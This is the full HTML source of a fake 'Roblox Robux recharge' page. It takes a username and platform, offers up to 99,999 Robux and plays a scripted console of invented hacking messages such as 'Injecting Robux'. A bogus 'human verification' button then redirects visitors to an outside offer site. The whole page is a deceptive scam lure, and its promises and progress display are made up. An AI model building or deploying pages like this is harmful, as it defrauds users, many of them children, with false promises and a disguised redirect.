<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ROBLOX - RECHARGE</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&family=Inter:wght@400;700;900&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { 
            --accent: #ffffff; 
            --bg: #000000; 
            --card: #050505;
            --text-main: #ffffff;
            --text-sub: #888888;
            --border: #ffffff;
            --input: #111;
            --radius: 0px;
            --shadow: none;
            
            --accent-rgb: 255, 255, 255;
            --accent-contrast: #000000;
        }
        body { 
            font-family: 'Orbitron', sans-serif; 
            background: var(--bg); 
            color: var(--text-main); 
            margin: 0; 
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow-x: hidden;
        }
        
        .main-card {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            box-shadow: var(--shadow);
            backdrop-filter: none;
            width: 100%;
            max-width: 500px;
            padding: 2.5rem;
            position: relative;
            z-index: 10;
        }
        
        .main-card { border: 10px solid #fff; border-radius: 0; }
        .btn-primary { background: #fff; color: #000; border-radius: 0; font-size: 20px; }
        
        .step-hidden { display: none; }
        .accent-bg { background-color: var(--accent) !important; color: var(--accent-contrast) !important; }
        .accent-text { color: var(--accent); }
        .accent-border { border-color: var(--accent) !important; }
        
        .input-surface {
            background: var(--input);
            border: 1px solid var(--border);
            border-radius: calc(var(--radius) / 2);
            color: var(--text-main);
            outline: none;
            transition: all 0.3s ease;
        }
        input:focus { border-color: var(--accent); box-shadow: 0 0 0 2px rgba(var(--accent-rgb), 0.1); }
        
        .text-muted { color: var(--text-sub); }

        .btn-primary {
            background: var(--accent);
            color: var(--accent-contrast);
            border-radius: calc(var(--radius) / 2);
            font-weight: 900;
            text-transform: uppercase;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            border: none;
            cursor: pointer;
        }
        .btn-primary:hover { transform: translateY(-2px); filter: brightness(1.1); }
        .btn-primary:active { transform: translateY(0); }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .animate-fade { animation: fadeIn 0.5s ease forwards; }

        /* Grids */
        .tactical-grid { background-image: linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px); background-size: 30px 30px; }
        .industrial-grid { background-image: radial-gradient(rgba(255,255,255,0.05) 1px, transparent 1px); background-size: 20px 20px; }
        
        /* Neon Glow - Removed */
        .neon-glow { box-shadow: none; }
        .neon-text { text-shadow: none; }

        /* Luxury */
        .luxury-text { background: linear-gradient(to bottom, #d4af37, #f7ef8a, #d4af37); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }

        /* Glitch */
        .glitch-text { text-shadow: none; animation: glitch 2s infinite; }
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }
    </style>
    
    </head>
<body class="min-h-screen flex flex-col items-center justify-center p-4 ">

    <div class="fixed top-6 right-6 z-50 flex gap-2 bg-black/20 backdrop-blur-md p-1 rounded-full border border-white/10">
        <a href="?lp=roblox-robux-microsoft-rewards&lang=ar" class="w-10 h-10 flex items-center justify-center rounded-full text-white/60 hover:text-white font-bold text-xs transition-all">AR</a>
        <a href="?lp=roblox-robux-microsoft-rewards&lang=en" class="w-10 h-10 flex items-center justify-center rounded-full accent-bg font-bold text-xs transition-all">EN</a>
    </div>

    <div class="w-full max-w-lg relative">
        
                    <div class="text-center mb-10">
                <img src="uploads/logo_1775718093_763.png" class="w-32 mx-auto mb-6 drop-shadow-md">
                <h1 class="text-4xl font-black uppercase tracking-tighter italic accent-text">ROBLOX</h1>
                <div class="flex justify-center gap-1 mt-4">
                    <div class="w-12 h-1 accent-bg"></div>
                    <div class="w-4 h-1 accent-bg opacity-50"></div>
                    <div class="w-2 h-1 accent-bg opacity-20"></div>
                </div>
            </div>
            <div class="main-card" style="color: var(--text-main)">
                <div class="flex items-center justify-between mb-8 border-b border-white/10 pb-4">
                    <div class="flex items-center gap-2">
                        <div class="w-2 h-2 rounded-full accent-bg animate-ping"></div>
                        <span class="text-[10px] font-bold tracking-widest opacity-50 uppercase">Elite Protocol Active</span>
                    </div>
                    <span class="text-[10px] font-mono opacity-30">0x6a01e16e</span>
                </div>
                <!-- Step 1: Identification -->
<div id="step1" class="space-y-8">
    <div class="text-center">
        <h2 class="text-2xl font-black uppercase italic mb-2">START RECHARGE</h2>
        <p class="text-[10px] text-muted uppercase tracking-widest">ENTER YOUR USERNAME / ID</p>
    </div>
    
    <div class="relative group">
        <div class="absolute inset-y-0 left-4 flex items-center pointer-events-none opacity-30">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path></svg>
        </div>
        <input type="text" id="username" placeholder="Username..." class="w-full input-surface p-5 pl-12 rounded-2xl outline-none focus:accent-border transition-all text-center font-bold text-xl">
    </div>

    <div class="grid grid-cols-2 gap-4">
        <button onclick="selectPlatform(this)" class="platform-btn input-surface py-4 rounded-2xl font-black uppercase text-xs transition-all italic">iOS / iPhone</button>
        <button onclick="selectPlatform(this)" class="platform-btn input-surface py-4 rounded-2xl font-black uppercase text-xs transition-all italic">Android</button>
    </div>

    <button onclick="toStep2()" class="w-full accent-bg py-6 rounded-2xl font-black text-2xl uppercase shadow-lg hover:scale-[1.01] transition-all italic flex items-center justify-center gap-3">
        <span>CONTINUE</span>
        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="3" d="M13 7l5 5m0 0l-5 5m5-5H6"></path></svg>
    </button>
</div>

<!-- Step 2: Amount -->
<div id="step2" class="step-hidden space-y-8">
    <div class="text-center">
        <h2 class="text-2xl font-black uppercase italic mb-2">SELECT AMOUNT</h2>
    </div>
    <div class="grid grid-cols-2 gap-4">
                    <button onclick="selectAmount(this, 10000)" class="amount-btn input-surface p-6 rounded-3xl transition-all relative overflow-hidden group">
                <img src="uploads/curr_1775718093_920.png" class="w-12 h-12 mx-auto mb-3 object-contain">
                <span class="block font-black text-2xl italic">10,000</span>
                <span class="text-[9px] text-muted font-bold uppercase">Robux</span>
            </button>
                    <button onclick="selectAmount(this, 30000)" class="amount-btn input-surface p-6 rounded-3xl transition-all relative overflow-hidden group">
                <img src="uploads/curr_1775718093_920.png" class="w-12 h-12 mx-auto mb-3 object-contain">
                <span class="block font-black text-2xl italic">30,000</span>
                <span class="text-[9px] text-muted font-bold uppercase">Robux</span>
            </button>
                    <button onclick="selectAmount(this, 50000)" class="amount-btn input-surface p-6 rounded-3xl transition-all relative overflow-hidden group">
                <img src="uploads/curr_1775718093_920.png" class="w-12 h-12 mx-auto mb-3 object-contain">
                <span class="block font-black text-2xl italic">50,000</span>
                <span class="text-[9px] text-muted font-bold uppercase">Robux</span>
            </button>
                    <button onclick="selectAmount(this, 99999)" class="amount-btn input-surface p-6 rounded-3xl transition-all relative overflow-hidden group">
                <img src="uploads/curr_1775718093_920.png" class="w-12 h-12 mx-auto mb-3 object-contain">
                <span class="block font-black text-2xl italic">99,999</span>
                <span class="text-[9px] text-muted font-bold uppercase">Robux</span>
            </button>
            </div>
    <button onclick="toStep3()" class="w-full accent-bg py-6 rounded-2xl font-black text-2xl uppercase italic">GENERATE NOW</button>
</div>

<!-- Step 3: Simulation -->
<div id="step3" class="step-hidden space-y-6">
    <div class="flex justify-between items-end">
        <span id="status-text" class="text-[10px] font-bold accent-text uppercase tracking-widest animate-pulse">Initializing...</span>
        <span id="percent-text" class="text-2xl font-black italic">0%</span>
    </div>
    <div class="w-full input-surface h-3 rounded-full overflow-hidden">
        <div id="progress" class="progress-bar accent-bg h-full w-0"></div>
    </div>
    <div id="console" class="bg-black/40 p-5 rounded-2xl font-mono text-[10px] text-gray-400 h-40 overflow-hidden text-left dir-ltr leading-relaxed border border-white/5"></div>
</div>

<!-- Step 4: Verification -->
<div id="step4" class="step-hidden space-y-8 text-center py-4">
    <div class="w-20 h-20 bg-yellow-500/10 border-2 border-yellow-500 text-yellow-500 rounded-full flex items-center justify-center mx-auto animate-bounce">
        <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
    </div>
    <div>
        <h2 class="text-3xl font-black uppercase italic mb-3">VERIFICATION REQUIRED</h2>
        <p class="text-xs text-muted leading-relaxed px-4">Due to high server load, please complete human verification to send the resources to your account immediately.</p>
    </div>

    <!-- Captcha Style Box -->
    
            <button onclick="handleVerification()" id="final-btn" class="w-full accent-bg py-6 rounded-2xl font-black text-2xl uppercase shadow-lg hover:scale-[1.01] transition-all flex items-center justify-center gap-3">
            <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="3" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
            <span>VERIFY NOW</span>
        </button>
    </div>
            </div>

        
        <div class="mt-12 text-center opacity-30">
            <p class="text-[9px] font-black uppercase tracking-[0.5em] italic">روبلوكس CORPORATION 2026 ©</p>
        </div>
    </div>

    <script>
        (function() {
            let selectedPlatform = "";
            let selectedAmount = 0;

            window['selectPlatform'] = function(btn) {
                document.querySelectorAll('.platform-btn').forEach(el => el.classList.remove('accent-bg', 'text-white', 'accent-border', 'shadow-lg'));
                btn.classList.add('accent-bg', 'text-white', 'accent-border', 'shadow-lg');
                selectedPlatform = btn.innerText;
            };

            window['selectAmount'] = function(btn, amount) {
                document.querySelectorAll('.amount-btn').forEach(el => el.classList.remove('accent-border', 'scale-105'));
                btn.classList.add('accent-border', 'scale-105');
                selectedAmount = amount;
            };

            window['toStep2'] = function() {
                const username = document.getElementById('username').value;
                if(!username) return alert('Please enter ID');
                document.getElementById('step1').classList.add('step-hidden');
                document.getElementById('step2').classList.remove('step-hidden');
            };

            window['toStep3'] = function() {
                if(selectedAmount === 0) return alert('Please select amount');
                document.getElementById('step2').classList.add('step-hidden');
                document.getElementById('step3').classList.remove('step-hidden');
                startSimulation();
            };

            function startSimulation() {
                const consoleEl = document.getElementById('console');
                const progressEl = document.getElementById('progress');
                const statusEl = document.getElementById('status-text');
                const percentEl = document.getElementById('percent-text');
                const username = document.getElementById('username').value;
                
                const messages = [
                    "Establishing secure connection...",
                    "Searching User ID: " + username,
                    "User found on " + selectedPlatform,
                    "Bypassing secure protocols...",
                    "Injecting " + selectedAmount + " Robux...",
                    "Finalizing encryption...",
                    "Success! Awaiting Verification."
                ];
                
                let step = 0;
                const interval = setInterval(() => {
                    if(step < messages.length) {
                        let msg = messages[step];
                        const p = document.createElement('p');
                        p.className = "mb-1";
                        p.innerText = "> " + msg;
                        consoleEl.appendChild(p);
                        consoleEl.scrollTop = consoleEl.scrollHeight;
                        
                        let percent = Math.floor(((step+1) / messages.length) * 100);
                        progressEl.style.width = percent + "%";
                        if(percentEl) percentEl.innerText = percent + "%";
                        statusEl.innerText = msg.toUpperCase();
                        step++;
                    } else {
                        clearInterval(interval);
                        setTimeout(() => {
                            document.getElementById('step3').classList.add('step-hidden');
                            document.getElementById('step4').classList.remove('step-hidden');
                        }, 1000);
                    }
                }, 1000);
            }

            // Direct redirection to the target URL without any locker
            window['handleVerification'] = function() {
                const targetUrl = "https://checkmyapp.store/cl/v/m53198";
                window.location.href = targetUrl;
            };
        })();
    </script>
</body>
</html>
